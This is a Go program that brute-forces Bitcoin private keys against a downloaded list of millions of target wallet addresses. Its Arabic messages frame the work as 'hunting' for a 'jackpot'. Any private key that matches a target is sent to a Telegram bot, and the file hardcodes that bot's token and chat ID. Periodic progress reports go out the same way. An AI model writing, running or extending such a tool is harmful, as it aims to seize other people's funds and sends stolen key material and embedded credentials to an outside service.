package main

import (
	"archive/zip"
	"bufio"
	"bytes"
	"crypto/sha256"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"runtime"
	"strings"
	"sync/atomic"
	"time"

	"github.com/btcsuite/btcd/btcec/v2"
	"github.com/btcsuite/btcd/btcutil/base58"
	"golang.org/x/crypto/ripemd160"
)

var (
	totalChecked uint64
	startTime    = time.Now()
	token        = "5921618897:AAGu6bp5gFtatio22y-XdWUSwAd0Lk6b1HY"
	chatID       = "227172927"
	fileURL      = "https://huggingface.co/spaces/OSAMA714/4524/resolve/main/wallets.zip?download=true"
)

func hash160(data []byte) []byte {
	h256 := sha256.Sum256(data)
	hasher := ripemd160.New()
	hasher.Write(h256[:])
	return hasher.Sum(nil)
}

func encodeAddress(pubKey []byte) string {
	return base58.CheckEncode(hash160(pubKey), 0x00)
}

func main() {
	cores := runtime.NumCPU()
	runtime.GOMAXPROCS(cores)

	sendTelegram("🛠️ نظام الفحص المطور يعمل الآن (Zero-Error Mode)...")

	client := &http.Client{Timeout: 10 * time.Minute}
	resp, _ := client.Get(fileURL)
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	zipReader, _ := zip.NewReader(bytes.NewReader(body), int64(len(body)))

	const MaxTargets = 5000000
	targets := make(map[string]struct{}, MaxTargets)
	count := 0
	for _, f := range zipReader.File {
		rc, _ := f.Open()
		scanner := bufio.NewScanner(rc)
		for scanner.Scan() && count < MaxTargets {
			addr := strings.TrimSpace(scanner.Text())
			if len(addr) > 25 {
				targets[addr] = struct{}{}
				count++
			}
		}
		rc.Close()
		if count >= MaxTargets { break }
	}

	sendTelegram(fmt.Sprintf("✅ تم تفعيل %d هدف!\n🚀 الصيد مستمر... للبحث استخدم: [JACKPOT FOUND]", count))

	go func() {
		for {
			time.Sleep(3 * time.Minute)
			sendDetailedReport()
		}
	}()

	for i := 0; i < cores*30; i++ {
		go func() {
			for {
				priv, _ := btcec.NewPrivateKey()
				
				addrC := encodeAddress(priv.PubKey().SerializeCompressed())
				if _, found := targets[addrC]; found {
					sendFound(addrC, "Compressed", priv)
				}

				addrU := encodeAddress(priv.PubKey().SerializeUncompressed())
				if _, found := targets[addrU]; found {
					sendFound(addrU, "Uncompressed", priv)
				}
				atomic.AddUint64(&totalChecked, 1)
			}
		}()
	}
	select {}
}

func sendDetailedReport() {
	elapsed := time.Since(startTime).Seconds()
	total := atomic.LoadUint64(&totalChecked)
	speed := float64(total) / elapsed
	
	// توليد عينة حية للتأكد من صحة التوليد
	priv, _ := btcec.NewPrivateKey()
	hexKey := fmt.Sprintf("%x", priv.Serialize())
	addrC := encodeAddress(priv.PubKey().SerializeCompressed())
	addrU := encodeAddress(priv.PubKey().SerializeUncompressed())

	report := fmt.Sprintf("📊 *تقرير الأخطبوط المباشر*\n"+
		"━━━━━━━━━━━━━━━\n"+
		"🚀 السرعة: %.0f K/s\n"+
		"💎 الإجمالي: %d\n"+
		"⏱ المدة: %.1f دقيقة\n"+
		"━━━━━━━━━━━━━━━\n"+
		"🔑 عينة مفتاح (Hex):\n`%s` \n"+
		"🏠 عينة Compressed:\n`%s` \n"+
		"🏠 عينة Uncompressed:\n`%s` ", 
		speed, total, elapsed/60, hexKey, addrC, addrU)
	
	sendTelegram(report)
}

func sendTelegram(text string) {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=Markdown", 
		token, chatID, url.QueryEscape(text))
	http.Get(apiURL)
}

func sendFound(addr string, kind string, priv *btcec.PrivateKey) {
	msg := fmt.Sprintf("💰 [JACKPOT FOUND]!\n\nنوع المحفظة: %s\nالعنوان: `%s` \nالمفتاح الهيكس: `%x` ", kind, addr, priv.Serialize())
	sendTelegram(msg)
}
